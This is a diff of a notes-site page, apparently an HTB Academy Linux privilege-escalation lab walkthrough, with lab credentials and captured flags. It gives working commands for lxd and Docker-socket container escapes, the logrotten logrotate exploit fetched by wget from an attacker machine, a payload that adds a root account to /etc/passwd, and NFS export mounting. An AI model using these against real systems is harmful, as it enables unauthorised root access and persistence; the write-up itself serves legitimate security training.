@@ -19436,6 +19436,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#linux-internals-based-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Internals-based Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -19730,10 +19739,560 @@ Enumerate the Linux environment and look for interesting files that might contai
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>cat /root/cron_abuse/flag.txt
 </span></code></pre></div></td></tr></table></div>
 <p>Results: 14347a2c977eb84508d3d50691a7ac4b</p>
+<p>SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!".  Escalate the privileges and submit the contents of flag.txt as the answer.</p>
+<p>We note that we belong to the group lxd</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a>id
+</span></code></pre></div></td></tr></table></div>
+<p><img alt="" src="../img/lxd_00.png" /></p>
+<p>We note that we have a container image in our home folder. We also note that lxc is installed in our machine:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>cd ContainerImages
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a>ls -la
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>which lxc
+</span></code></pre></div></td></tr></table></div>
+<p>We import the image and list available images to check that it's there:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
+<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias myimage
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>lxc image list
+</span></code></pre></div></td></tr></table></div>
+<p>Initiate your image inside a new container that we call ignite:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>lxc init myimage ignite -c security.privileged=true
+</span></code></pre></div></td></tr></table></div>
+<p>Mount the container inside the /root directory</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+</span></code></pre></div></td></tr></table></div>
+<p>Initialize the container</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>lxc start ignite
+</span></code></pre></div></td></tr></table></div>
+<p>Launch a shell command in the container</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>lxc exec ignite /bin/sh
+</span></code></pre></div></td></tr></table></div>
+<p>List the root folder within the mounted unit at <code>/mnt/root</code>:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>ls -l /mnt/root/root
+</span></code></pre></div></td></tr></table></div>
+<p>Print the flag:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>cat  /mnt/root/root/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{C0nT41n3rs_uhhh}</p>
+<p><strong>SSH to  (ACADEMY-LLPE-DOCKER) with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span>
+<span class="normal"><a href="#__codelineno-27-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>ssh htb-student@$ip
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3"></a># WE check the groups that we belong to
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4"></a>id
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)
+</span></code></pre></div></td></tr></table></div>
+<p>We will abuse writable docker socket. Usually, this socket is located in /var/run/docker.sock. Checking out:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>ls -la /var/run/docker.sock
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>srw-rw---- 1 root docker 0 /var/run/docker.sock
+</span></code></pre></div></td></tr></table></div>
+<p>If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="go">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We open a docker instance with  root access. The folder /root is also mounted at the /root location. We can print the flag.txt</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span>
+<span class="normal"><a href="#__codelineno-32-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>ls -la /root
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2"></a>cat /root/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{D0ck3r_Pr1vE5c}</p>
+<p><strong>SH to  (ACADEMY-LLPE-LOG) with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate the privileges and submit the contents of flag.txt as the answer.</strong></p>
+<p>Connect via ssh to the target. </p>
+<p>We run linpeas_linux_amd64 and notice the lines:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1"></a>
+</span></code></pre></div></td></tr></table></div>
+<p>To exploit <code>logrotate</code>, we need some requirements that we have to fulfill.</p>
+<p><strong>1.</strong>  we need <code>write</code> permissions on the log files</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-34-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1"></a>ls -la /home/htb-student/backups
+</span></code></pre></div></td></tr></table></div>
+<p><strong>2.</strong> logrotate must run as a privileged user or <code>root</code>. This is the normal behaviour.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-35-1">1</a></span>
+<span class="normal"><a href="#__codelineno-35-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1"></a>which logrotate
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2"></a>ls -la /usr/sbin/logrotate
+</span></code></pre></div></td></tr></table></div>
+<p><strong>3.</strong> vulnerable versions:
+    - 3.8.6
+    - 3.11.0
+    - 3.15.0
+    - 3.18.0</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-36-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1"></a>logrotate --version
+</span></code></pre></div></td></tr></table></div>
+<p>Output is 3.11.</p>
+<p>Craft the payload:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-37-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1"></a>echo &#39;cat /root/flag.txt &gt; /home/htb-student/flag.txt&#39; &gt; payload
+</span></code></pre></div></td></tr></table></div>
+<p>Run the exploit:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-38-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-38-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-38-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-38-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-38-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-38-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-38-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-38-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-38-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-38-10">10</a></span>
+<span class="normal"><a href="#__codelineno-38-11">11</a></span>
+<span class="normal"><a href="#__codelineno-38-12">12</a></span>
+<span class="normal"><a href="#__codelineno-38-13">13</a></span>
+<span class="normal"><a href="#__codelineno-38-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1"></a># In the kali machine
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2"></a>git clone https://github.com/whotwagner/logrotten.git
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3"></a>cd logrotten
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4"></a>python3 -m http.server 80
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5"></a>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6"></a># In the target host, download the file and compile it:
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7"></a>wget http://10.10.15.41/logrotten.c
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8"></a>gcc -o logrotten logrotten.c
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9"></a>
+</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10"></a># Run the exploit
+</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11"></a>./logrotten -p payload /home/htb-student/backups/access.log
+</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12"></a>
+</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13"></a># Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
+</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14"></a>echo &quot;This is a string&quot; &gt; /home/htb-student/backups/access.log
+</span></code></pre></div></td></tr></table></div>
+<p>As an outcome (we need to run this even 3 times), we will obtain the flag.txt in our /home/htb-student folder.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-39-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1"></a>cat /home/htb-student/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results:  HTB{l0G_r0t7t73N_00ps}</p>
+<p>Another way to do it:</p>
+<p>We will generate a new user with root capabilities:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-40-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-40-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-40-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-40-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-40-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-40-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-40-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-40-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-40-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-40-10">10</a></span>
+<span class="normal"><a href="#__codelineno-40-11">11</a></span>
+<span class="normal"><a href="#__codelineno-40-12">12</a></span>
+<span class="normal"><a href="#__codelineno-40-13">13</a></span>
+<span class="normal"><a href="#__codelineno-40-14">14</a></span>
+<span class="normal"><a href="#__codelineno-40-15">15</a></span>
+<span class="normal"><a href="#__codelineno-40-16">16</a></span>
+<span class="normal"><a href="#__codelineno-40-17">17</a></span>
+<span class="normal"><a href="#__codelineno-40-18">18</a></span>
+<span class="normal"><a href="#__codelineno-40-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1"></a># Generate a hashed password in the target host. My password is going to be &quot;password123&quot;
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2"></a>openssl passwd -1 password123
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3"></a>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4"></a># Craft the payload. This payload will add the user lele with password password123 with the home directory set to root
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5"></a># username:hashed_password:UID:GID:comment:home_directory:shell
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6"></a>echo &quot;echo echo &quot;echo &#39;lele:\$1\$twJx/0OM\$PhLy4vWVoaEWLrd52BDbq/:0:0:lele:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&quot; &gt; payload
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7"></a>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8"></a># Run the exploit
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9"></a>./logrotten -p payload /home/htb-student/backups/access.log
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10"></a>
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11"></a># Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12"></a>echo &quot;This is a string&quot; &gt; /home/htb-student/backups/access.log
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13"></a>
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14"></a># Now we wait for some minutes and after a while, we can cat the /etc/passwd file and see the lele user in there:
+</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15"></a>cat /etc/passwd
+</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16"></a>
+</span><span id="__span-40-17"><a id="__codelineno-40-17" name="__codelineno-40-17"></a># We can impersonate lele
+</span><span id="__span-40-18"><a id="__codelineno-40-18" name="__codelineno-40-18"></a>su lele
+</span><span id="__span-40-19"><a id="__codelineno-40-19" name="__codelineno-40-19"></a># Enter password password123
+</span></code></pre></div></td></tr></table></div>
+<p>SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Review the NFS server's export list and find a directory holding a flag.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-41-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-41-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-41-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-41-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-41-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-41-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-41-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-41-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-41-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-41-10">10</a></span>
+<span class="normal"><a href="#__codelineno-41-11">11</a></span>
+<span class="normal"><a href="#__codelineno-41-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1"></a>ssh htb-student@ip
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2"></a>cat /etc/exports
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3"></a>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4"></a># From the attacking machine:
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5"></a>mkdir ~/borrar/target-NFS
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6"></a>sudo mount -t nfs 10.129.2.210:/var ~/borrar/target-NFS/
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7"></a>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8"></a># List contents
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9"></a>tree .
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10"></a>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11"></a># Print the flag 
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12"></a>cat /var/nfs/general/exports_flag.txt
+</span></code></pre></div></td></tr></table></div>
+<h2 id="linux-internals-based-privilege-escalation">Linux Internals-based Privilege Escalation</h2>
+<p><strong>SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-42-1">1</a></span>
+<span class="normal"><a href="#__codelineno-42-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1"></a>ssh htb-student@$ip
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2"></a>uname -a
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-43-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1"></a>Linux NIX02 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></div></td></tr></table></div>
+<p>After looking for it, I found: https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-44-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1"></a>nano exploit.c
+</span></code></pre></div></td></tr></table></div>
+<p>Content:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-45-1">  1</a></span>
+<span class="normal"><a href="#__codelineno-45-2">  2</a></span>
+<span class="normal"><a href="#__codelineno-45-3">  3</a></span>
+<span class="normal"><a href="#__codelineno-45-4">  4</a></span>
+<span class="normal"><a href="#__codelineno-45-5">  5</a></span>
+<span class="normal"><a href="#__codelineno-45-6">  6</a></span>
+<span class="normal"><a href="#__codelineno-45-7">  7</a></span>
+<span class="normal"><a href="#__codelineno-45-8">  8</a></span>
+<span class="normal"><a href="#__codelineno-45-9">  9</a></span>
+<span class="normal"><a href="#__codelineno-45-10"> 10</a></span>
+<span class="normal"><a href="#__codelineno-45-11"> 11</a></span>
+<span class="normal"><a href="#__codelineno-45-12"> 12</a></span>
+<span class="normal"><a href="#__codelineno-45-13"> 13</a></span>
+<span class="normal"><a href="#__codelineno-45-14"> 14</a></span>
+<span class="normal"><a href="#__codelineno-45-15"> 15</a></span>
+<span class="normal"><a href="#__codelineno-45-16"> 16</a></span>
+<span class="normal"><a href="#__codelineno-45-17"> 17</a></span>
+<span class="normal"><a href="#__codelineno-45-18"> 18</a></span>
+<span class="normal"><a href="#__codelineno-45-19"> 19</a></span>
+<span class="normal"><a href="#__codelineno-45-20"> 20</a></span>
+<span class="normal"><a href="#__codelineno-45-21"> 21</a></span>
+<span class="normal"><a href="#__codelineno-45-22"> 22</a></span>
+<span class="normal"><a href="#__codelineno-45-23"> 23</a></span>
+<span class="normal"><a href="#__codelineno-45-24"> 24</a></span>
+<span class="normal"><a href="#__codelineno-45-25"> 25</a></span>
+<span class="normal"><a href="#__codelineno-45-26"> 26</a></span>
+<span class="normal"><a href="#__codelineno-45-27"> 27</a></span>
+<span class="normal"><a href="#__codelineno-45-28"> 28</a></span>
+<span class="normal"><a href="#__codelineno-45-29"> 29</a></span>
+<span class="normal"><a href="#__codelineno-45-30"> 30</a></span>
+<span class="normal"><a href="#__codelineno-45-31"> 31</a></span>
+<span class="normal"><a href="#__codelineno-45-32"> 32</a></span>
+<span class="normal"><a href="#__codelineno-45-33"> 33</a></span>
+<span class="normal"><a href="#__codelineno-45-34"> 34</a></span>
+<span class="normal"><a href="#__codelineno-45-35"> 35</a></span>
+<span class="normal"><a href="#__codelineno-45-36"> 36</a></span>
+<span class="normal"><a href="#__codelineno-45-37"> 37</a></span>
+<span class="normal"><a href="#__codelineno-45-38"> 38</a></span>
+<span class="normal"><a href="#__codelineno-45-39"> 39</a></span>
+<span class="normal"><a href="#__codelineno-45-40"> 40</a></span>
+<span class="normal"><a href="#__codelineno-45-41"> 41</a></span>
+<span class="normal"><a href="#__codelineno-45-42"> 42</a></span>
+<span class="normal"><a href="#__codelineno-45-43"> 43</a></span>
+<span class="normal"><a href="#__codelineno-45-44"> 44</a></span>
+<span class="normal"><a href="#__codelineno-45-45"> 45</a></span>
+<span class="normal"><a href="#__codelineno-45-46"> 46</a></span>
+<span class="normal"><a href="#__codelineno-45-47"> 47</a></span>
+<span class="normal"><a href="#__codelineno-45-48"> 48</a></span>
+<span class="normal"><a href="#__codelineno-45-49"> 49</a></span>
+<span class="normal"><a href="#__codelineno-45-50"> 50</a></span>
+<span class="normal"><a href="#__codelineno-45-51"> 51</a></span>
+<span class="normal"><a href="#__codelineno-45-52"> 52</a></span>
+<span class="normal"><a href="#__codelineno-45-53"> 53</a></span>
+<span class="normal"><a href="#__codelineno-45-54"> 54</a></span>
+<span class="normal"><a href="#__codelineno-45-55"> 55</a></span>
+<span class="normal"><a href="#__codelineno-45-56"> 56</a></span>
+<span class="normal"><a href="#__codelineno-45-57"> 57</a></span>
+<span class="normal"><a href="#__codelineno-45-58"> 58</a></span>
+<span class="normal"><a href="#__codelineno-45-59"> 59</a></span>
+<span class="normal"><a href="#__codelineno-45-60"> 60</a></span>
+<span class="normal"><a href="#__codelineno-45-61"> 61</a></span>
+<span class="normal"><a href="#__codelineno-45-62"> 62</a></span>
+<span class="normal"><a href="#__codelineno-45-63"> 63</a></span>
+<span class="normal"><a href="#__codelineno-45-64"> 64</a></span>
+<span class="normal"><a href="#__codelineno-45-65"> 65</a></span>
+<span class="normal"><a href="#__codelineno-45-66"> 66</a></span>
+<span class="normal"><a href="#__codelineno-45-67"> 67</a></span>
+<span class="normal"><a href="#__codelineno-45-68"> 68</a></span>
+<span class="normal"><a href="#__codelineno-45-69"> 69</a></span>
+<span class="normal"><a href="#__codelineno-45-70"> 70</a></span>
+<span class="normal"><a href="#__codelineno-45-71"> 71</a></span>
+<span class="normal"><a href="#__codelineno-45-72"> 72</a></span>
+<span class="normal"><a href="#__codelineno-45-73"> 73</a></span>
+<span class="normal"><a href="#__codelineno-45-74"> 74</a></span>
+<span class="normal"><a href="#__codelineno-45-75"> 75</a></span>
+<span class="normal"><a href="#__codelineno-45-76"> 76</a></span>
+<span class="normal"><a href="#__codelineno-45-77"> 77</a></span>
+<span class="normal"><a href="#__codelineno-45-78"> 78</a></span>
+<span class="normal"><a href="#__codelineno-45-79"> 79</a></span>
+<span class="normal"><a href="#__codelineno-45-80"> 80</a></span>
+<span class="normal"><a href="#__codelineno-45-81"> 81</a></span>
+<span class="normal"><a href="#__codelineno-45-82"> 82</a></span>
+<span class="normal"><a href="#__codelineno-45-83"> 83</a></span>
+<span class="normal"><a href="#__codelineno-45-84"> 84</a></span>
+<span class="normal"><a href="#__codelineno-45-85"> 85</a></span>
+<span class="normal"><a href="#__codelineno-45-86"> 86</a></span>
+<span class="normal"><a href="#__codelineno-45-87"> 87</a></span>
+<span class="normal"><a href="#__codelineno-45-88"> 88</a></span>
+<span class="normal"><a href="#__codelineno-45-89"> 89</a></span>
+<span class="normal"><a href="#__codelineno-45-90"> 90</a></span>
+<span class="normal"><a href="#__codelineno-45-91"> 91</a></span>
+<span class="normal"><a href="#__codelineno-45-92"> 92</a></span>
+<span class="normal"><a href="#__codelineno-45-93"> 93</a></span>
+<span class="normal"><a href="#__codelineno-45-94"> 94</a></span>
+<span class="normal"><a href="#__codelineno-45-95"> 95</a></span>
+<span class="normal"><a href="#__codelineno-45-96"> 96</a></span>
+<span class="normal"><a href="#__codelineno-45-97"> 97</a></span>
+<span class="normal"><a href="#__codelineno-45-98"> 98</a></span>
+<span class="normal"><a href="#__codelineno-45-99"> 99</a></span>
+<span class="normal"><a href="#__codelineno-45-100">100</a></span>
+<span class="normal"><a href="#__codelineno-45-101">101</a></span>
+<span class="normal"><a href="#__codelineno-45-102">102</a></span>
+<span class="normal"><a href="#__codelineno-45-103">103</a></span>
+<span class="normal"><a href="#__codelineno-45-104">104</a></span>
+<span class="normal"><a href="#__codelineno-45-105">105</a></span>
+<span class="normal"><a href="#__codelineno-45-106">106</a></span>
+<span class="normal"><a href="#__codelineno-45-107">107</a></span>
+<span class="normal"><a href="#__codelineno-45-108">108</a></span>
+<span class="normal"><a href="#__codelineno-45-109">109</a></span>
+<span class="normal"><a href="#__codelineno-45-110">110</a></span>
+<span class="normal"><a href="#__codelineno-45-111">111</a></span>
+<span class="normal"><a href="#__codelineno-45-112">112</a></span>
+<span class="normal"><a href="#__codelineno-45-113">113</a></span>
+<span class="normal"><a href="#__codelineno-45-114">114</a></span>
+<span class="normal"><a href="#__codelineno-45-115">115</a></span>
+<span class="normal"><a href="#__codelineno-45-116">116</a></span>
+<span class="normal"><a href="#__codelineno-45-117">117</a></span>
+<span class="normal"><a href="#__codelineno-45-118">118</a></span>
